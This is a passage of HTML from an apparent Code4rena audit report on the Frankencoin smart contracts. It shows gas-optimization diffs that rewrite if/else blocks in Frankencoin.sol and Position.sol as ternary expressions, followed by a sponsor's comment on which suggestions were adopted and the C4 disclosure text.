     return pos;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<h2 id=\"note-the-following-have-some-caveats-we-can-reduce-the-deployment-size-and-deployment-cost-at-the-expense-of-execution-cost\" style=\"position:relative;\"><a href=\"#note-the-following-have-some-caveats-we-can-reduce-the-deployment-size-and-deployment-cost-at-the-expense-of-execution-cost\" aria-label=\"note the following have some caveats we can reduce the deployment size and deployment cost at the expense of execution cost permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Note: The following have some caveats, we can reduce the deployment size and deployment cost at the expense of execution cost</h2>\n<h3 id=\"shorthand-if-we-can-rewrite-the-following-\" style=\"position:relative;\"><a href=\"#shorthand-if-we-can-rewrite-the-following-\" aria-label=\"shorthand if we can rewrite the following  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Shorthand if (We can rewrite the following )</h3>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Frankencoin.sol#L204-L213\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Frankencoin.sol#L204-L213</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"85\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Frankencoin</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">204</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">calculateAssignedReserve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintedAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_reservePPM</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">205</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">theoreticalReserve</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_reservePPM</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">mintedAmount</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">1000000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">206</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentReserve</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">207</span><span class=\"mtk1\">:      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">currentReserve</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk11\">minterReserve</span><span class=\"mtk1\">()){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">208</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// not enough reserves, owner has to take a loss</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">209</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">theoreticalReserve</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">currentReserve</span><span class=\"mtk1\"> / </span><span class=\"mtk11\">minterReserve</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">210</span><span class=\"mtk1\">:      } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">211</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">theoreticalReserve</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">212</span><span class=\"mtk1\">:      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">213</span><span class=\"mtk1\">:   }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"86\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/Frankencoin.sol b/contracts/Frankencoin.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index e9e87dc..600b805 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/Frankencoin.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/Frankencoin.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -204,12 +204,7 @@ contract Frankencoin is ERC20PermitLight, IFrankencoin {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function calculateAssignedReserve(uint256 mintedAmount, uint32 _reservePPM) public view returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       uint256 theoreticalReserve = _reservePPM * mintedAmount / 1000000;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       uint256 currentReserve = balanceOf(address(reserve));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      if (currentReserve &lt; minterReserve()){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-         // not enough reserves, owner has to take a loss</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-         return theoreticalReserve * currentReserve / minterReserve();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-         return theoreticalReserve;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      return currentReserve &lt; minterReserve() ? theoreticalReserve * currentReserve / minterReserve() : theoreticalReserve;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Frankencoin.sol#L138-L146\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Frankencoin.sol#L138-L146</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"87\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Frankencoin</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">138</span><span class=\"mtk1\">:   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">equity</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">139</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">140</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minReserve</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">minterReserve</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">141</span><span class=\"mtk1\">:      </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">minReserve</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">142</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">143</span><span class=\"mtk1\">:      } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">144</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">minReserve</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">145</span><span class=\"mtk1\">:      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">146</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"88\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/Frankencoin.sol b/contracts/Frankencoin.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index e9e87dc..f9fef16 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/Frankencoin.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/Frankencoin.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -138,11 +138,7 @@ contract Frankencoin is ERC20PermitLight, IFrankencoin {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function equity() public view returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       uint256 balance = balanceOf(address(reserve));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       uint256 minReserve = minterReserve();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      if (balance &lt;= minReserve){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        return 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        return balance - minReserve;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      return balance &lt;= minReserve ? 0 : balance - minReserve;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L120-L126\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L120-L126</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"89\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">120</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getUsableMint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalMint</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">afterFees</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">121</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">afterFees</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">122</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalMint</span><span class=\"mtk1\"> * (</span><span class=\"mtk7\">1000_000</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">reserveContribution</span><span class=\"mtk1\"> - </span><span class=\"mtk11\">calculateCurrentFee</span><span class=\"mtk1\">()) / </span><span class=\"mtk7\">1000_000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">123</span><span class=\"mtk1\">:        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">124</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalMint</span><span class=\"mtk1\"> * (</span><span class=\"mtk7\">1000_000</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">reserveContribution</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1000_000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">125</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">126</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"90\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/Position.sol b/contracts/Position.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 3e18534..15183e9 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/Position.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/Position.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -118,11 +118,7 @@ contract Position is Ownable, IPosition, MathUtil {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      * to buy reserve pool shares.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function getUsableMint(uint256 totalMint, bool afterFees) public view returns (uint256){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (afterFees){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            return totalMint * (1000_000 - reserveContribution - calculateCurrentFee()) / 1000_000;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            return totalMint * (1000_000 - reserveContribution) / 1000_000;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        return afterFees? totalMint * (1000_000 - reserveContribution - calculateCurrentFee()) / 1000_000 : totalMint * (1000_000 - reserveContribution) / 1000_000;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L181-L189\">https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L181-L189</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"91\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">calculateCurrentFee</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint32</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">184</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">time</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">exp</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">185</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">186</span><span class=\"mtk1\">:        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">187</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mintingFeePPM</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">mintingFeePPM</span><span class=\"mtk1\"> * (</span><span class=\"mtk12\">time</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">start</span><span class=\"mtk1\">) / (</span><span class=\"mtk12\">exp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">start</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">188</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">189</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"92\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/Position.sol b/contracts/Position.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 3e18534..9adc148 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/Position.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/Position.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -181,11 +181,7 @@ contract Position is Ownable, IPosition, MathUtil {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function calculateCurrentFee() public view returns (uint32) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 exp = expiration;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 time = block.timestamp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (time &gt;= exp){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            return 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            return uint32(mintingFeePPM - mintingFeePPM * (time - start) / (exp - start));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        return time &gt;= exp ? 0 : uint32(mintingFeePPM - mintingFeePPM * (time - start) / (exp - start));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/956#issuecomment-1528891079\">luziusmeisser (Frankencoin) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Went through all of the issues and implemented the recommendations.</p>\n<p>Exceptions:</p>\n<ul>\n<li><strong>“Frankencoin.sol.suggestMinter(): Result of totalSupply() should be cached here(sad path)“:</strong> Here, totalSupply() is never called during normal operations as the &#x26;&#x26; operator does not evaluate the second part if the first part is already false. So the recommendation would actually increase gas costs.</li>\n<li><strong>“Frankencoin.sol.suggestMinter(): minters[_minter] should be cached in local storage”:</strong> Second access is not an read, but a write.</li>\n<li><strong>“Using unchecked blocks to save gas”:</strong> I do not like this optimization as I value concise code higher than saving a little gas here.</li>\n<li><strong>“shorthand if”:</strong> I usually prefer the longer version to increase readability.</li>\n</ul>\n</blockquote>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: 